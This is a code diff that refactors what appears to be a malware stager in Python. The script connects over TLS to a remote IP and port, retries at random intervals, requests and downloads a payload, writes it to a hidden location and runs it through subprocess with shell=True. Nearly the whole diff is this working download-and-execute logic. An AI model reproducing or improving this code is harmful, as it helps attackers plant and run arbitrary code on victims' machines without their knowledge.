@@ -18,31 +18,53 @@ PAYLOAD_FILE = output_file
 
 HIDE_PAYLOAD = hide_payload
 
-# sock obj
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.settimeout(10)
 
-# connect
-sess = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)
+def connect():
+
+    # sock obj
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(10)
+
+    # connect
+    sess = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)
+
+    while True:
+        try:
+            sess.connect((IP, PORT))
+            print('Establishing connection...')
+            break
+        except:
+            time.sleep(random.randint(15, 30))
+
+    return sess
+
+
+def get_payload(sess):
+
+    # request payload
+    sess.sendall(json.dumps({'code': STAGER_CODE, 'args': None}).encode())
+
+    # download payload
+    payload = b''
+
+    print('Downloading payload...')
+    while True:
+        try:
+            payload += sess.recv(BLOCK_SIZE)
+        except:
+            break
+
+    return payload
+
 
 while True:
-    try:
-        sess.connect((IP, PORT))
+    payload = get_payload(connect())
+
+    if len(payload):
         break
-    except:
-        time.sleep(random.randint(15, 30))
 
-# request payload
-sess.sendall(json.dumps({'code': STAGER_CODE, 'args': None}).encode())
-
-# download payload
-payload = b''
-
-while True:
-    try:
-        payload += sess.recv(BLOCK_SIZE)
-    except:
-        break
+    print('Failed to download payload.\nRetrying...')
+    time.sleep(random.randint(15, 30))
 
 # write to file
 path = os.path.join(pathfinder.Finder().find(),
@@ -53,4 +75,4 @@ with open(path, 'wb') as f:
         f.write(payload[i:i + BLOCK_SIZE])
 
 # execute
-subprocess.call([path])
+subprocess.call(path.split(), shell=True)
